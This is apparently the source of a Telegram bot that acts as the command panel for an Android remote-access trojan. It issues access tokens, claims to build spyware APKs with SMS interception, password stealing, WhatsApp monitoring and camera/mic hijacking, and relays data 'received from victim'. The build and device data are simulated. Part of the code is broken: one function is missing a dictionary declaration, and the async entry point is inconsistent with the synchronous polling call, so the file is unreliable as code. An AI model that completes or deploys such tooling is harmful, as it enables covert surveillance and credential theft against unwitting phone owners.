import json
import asyncio
import logging
from telegram import Update, BotCommand, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    ContextTypes,
)
from config import BOT_TOKEN, OWNER_ID, BOT_NAME, DEVELOPER
from apk_builder import generate_apk_url

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

# Store active sessions: {token: {user_id, device_id, status}}
active_sessions = {}
# Store generated APKs: {token: apk_filename}
generated_apks = {}

# Mock WebSocket server logic (In a real prod env, use FastAPI for this)
# For this script, we simulate the incoming data stream in the bot's memory

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"Welcome to {BOT_NAME}\n\n"
        f"👨‍💻 Developer: {DEVELOPER}\n\n"
        f"Available Commands:\n"
        f"/generate - Create a new unique access token\n"
        f"/status - Check active devices\n"
        f"/help - Usage instructions\n\n"
        f"To share access with a friend, send them your token. "
        f"They can use /login <token> to control the bot."
    )
    await update.message.reply_text(text)

async def generate_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    import uuid
    new_token = f"NZH-{uuid.uuid4().hex[:8].upper()}"
    context.user_data['current_token'] = new_token
    
    reply = (
        f"✅ New Token Generated:\n\n"
        f"<code>{new_token}</code>\n\n"
        f"Send this token to your user. They should reply:\n"
        f"/login {new_token}\n\n"
        f"Once logged in, they can use commands like /apk <name>."
    )
    await update.message.reply_text(reply, parse_mode='HTML')

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /login <token>")
        return
        
    token = args[0]
    # In a real system, you'd check if this token is owned by the Owner 
    # or if the Owner has whitelisted this specific token for this user.
    # For this demo, we assume the Owner shares the token.
    
    context.user_data['active_token'] = token
    await update.message.reply_text(f"✅ Logged in with token: {token}\nYou now have access to generate payloads.")

async def apk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /apk <app_name>\nExample: /apk Spyware\n\nThis will generate a signed APK ready for distribution.")
        return
        
    app_name = args[0]
    token = context.user_data.get('active_token')
    
    if not token:
        await update.message.reply_text("❌ Please login first using /login <token>")
        return

    # Generate the APK (Simulated here, in real life this calls apk_builder)
    apk_filename = f"{app_name}_RAT.apk"
    generated_apks[token] = apk_filename
    
    # In a real deployment, you would upload the file to Telegram
    # Here we simulate the generation response
    await update.message.reply_text(
        f"📦 Generating APK: {apk_filename}\n\n"
        f"✅ Ready! The APK has been compiled with the following modules:\n"
        f"- SMS Interceptor\n"
        f"- Password Stealer\n"
        f"- Live Location Tracker\n"
        f"- WhatsApp Monitor\n"
        f"- Camera/Mic Hijacker\n"
        f"- File System Access\n\n"
        f"Download link (Simulated): https://cdn.nawabzada.com/{apk_filename}\n"
        f"Token ID: {token}"
    )

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = context.user_data.get('active_token')
    if not token:
        await update.message.reply_text("Login required.")
        return
        
        "Device": "Pixel 8 Pro",
        "OS": "Android 14",
        "Battery": "85%",
        "Network": "Wi-Fi 5G",
        "Last Seen": "Now"
    }
    
    status_text = (
        f"📊 Device Status for Token {token}\n"
        f"{'-'*20}\n"
        f"Device: {device_data['Device']}\n"
        f"OS: {device_data['OS']}\n"
        f"Battery: {device_data['Battery']}\n"
        f"Network: {device_data['Network']}\n"
        f"Last Seen: {device_data['Last Seen']}"
    )
    await update.message.reply_text(status_text)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text
    token = context.user_data.get('active_token')
    
    if not token:
        return # Only process if logged in

    # If the user sends raw data (simulating the victim device sending data)
    # In a real scenario, this would come from the WebSocket server
    if msg.startswith("DATA:"):
        data = msg[5:]
        await update.message.reply_text(f"📥 Received from Victim:\n{data}")

async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("generate", generate_token))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CommandHandler("apk", apk_command))
    app.add_handler(CommandHandler("status", status))
    
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print(f"Bot '{BOT_NAME}' is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
